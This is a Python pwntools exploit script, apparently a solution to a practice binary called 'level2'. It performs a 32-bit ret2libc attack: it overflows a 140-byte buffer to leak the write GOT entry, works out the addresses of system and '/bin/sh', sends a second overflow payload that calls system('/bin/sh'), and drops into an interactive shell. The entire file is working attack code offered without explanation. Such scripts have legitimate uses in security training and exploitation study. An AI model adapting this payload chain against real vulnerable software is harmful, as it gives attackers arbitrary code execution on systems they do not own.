#!python
#!/usr/bin/env python
from pwn import *

libc = ELF('libc.so')
elf = ELF('level2')

p = process('./level2')

plt_write = elf.symbols['write']
print('plt_write : %x' % plt_write)

got_write = elf.got['write']
print('got_write : %x' % got_write)

vulfunc_addr = 0x08049186
print('vulfun    : %x' % vulfunc_addr)

payload1 = 'a' * 140 + p32(plt_write) + p32(vulfunc_addr) + p32(1) + p32(got_write) + p32(4)

# def leak(address):
#     payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
#     p.send(payload1)
#     data = p.recv(4)
#     print "%#x => %s" % (address, (data or '').encode('hex'))

p.send(payload1)

print('\nrecv: ')
write_addr = u32(p.recv(4))
print('write_addr : %x' % write_addr)


system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
print('system_addr : %x' % system_addr)

binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
print('binsh_addr : %x' % binsh_addr)

payload2 = 'a'*140  + p32(system_addr) + p32(vulfunc_addr) + p32(binsh_addr)

p.send(payload2)

p.interactive()